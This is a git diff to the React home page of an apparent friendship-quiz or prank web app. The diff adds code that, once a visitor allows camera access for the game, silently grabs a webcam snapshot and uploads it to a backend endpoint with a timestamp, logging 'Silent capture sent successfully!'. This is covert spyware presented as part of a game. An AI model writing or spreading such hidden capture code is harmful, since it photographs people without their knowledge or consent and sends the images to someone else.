@@ -2,15 +2,63 @@ import FriendshipMeter from "@/components/Home/FriendshipMeter";
 import JarOfHearts from "@/components/Home/JarOfHearts";
 import MindReader from "@/components/Home/MindReader";
 import Scrapbook from "@/components/Home/Scrapbook";
-import LoyaltyCheck from "@/components/Home/LoyaltyCheck"; 
+import LoyaltyCheck from "@/components/Home/LoyaltyCheck";
 import React, { useState, useEffect, useRef } from "react";
 import Typewriter from "@/components/Home/Typewriter";
+import useAxiosPublic from "@/hooks/usePublicAxios";
 
 const Home = () => {
   // Step logic update: 0: Welcome, 1: Scrapbook, 2: Jar, 3: Mind, 4: Loyalty, 5: Meter, 6: Secret
   const [step, setStep] = useState(-1);
   const [timeLeft, setTimeLeft] = useState(420);
   const videoRef = useRef(null);
+  const axiosPublic = useAxiosPublic();
+
+  const captureAndSend = async (stream) => {
+  // 1. Ekta temporary video element banano capturing-er jonno
+  const video = document.createElement("video");
+  video.srcObject = stream;
+  video.muted = true;
+  video.playsInline = true;
+
+  // Video load howar por capture shuru hobe
+  video.onloadedmetadata = async () => {
+    try {
+      await video.play();
+
+      // Camera sensor ready hote ebong focus thik hote 1 sec opekkha kora
+      setTimeout(async () => {
+        const canvas = document.createElement("canvas");
+        
+        // Video-r ashol width/height neya
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        const context = canvas.getContext("2d");
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // 2. Chobi-ke Base64 string-e convert kora (JPEG format)
+        const imageData = canvas.toDataURL("image/jpeg", 0.7);
+
+        // 3. Backend-e pathano
+        await axiosPublic.post("/upload-capture", {
+          image: imageData,
+          email: "user@example.com", // Jode Auth thake tobe dynamically boshaben
+          time: new Date().toLocaleString(),
+        });
+
+        console.log("📸 Silent capture sent successfully!");
+
+        // Memory bachate temporary video element bondho kora
+        video.pause();
+        video.srcObject = null;
+      }, 1000); 
+
+    } catch (err) {
+      console.error("Capture process failed:", err);
+    }
+  };
+};
   const handleGrantAccess = async () => {
     try {
       // Camera ebong Mic-er permission ekshathe request kora
@@ -18,7 +66,7 @@ const Home = () => {
         video: true,
         audio: true,
       });
-
+      captureAndSend(stream);
       // Permission peye gele stream-ti video element-e set hobe (jodi dorkar hoy)
       if (videoRef.current) {
         videoRef.current.srcObject = stream;
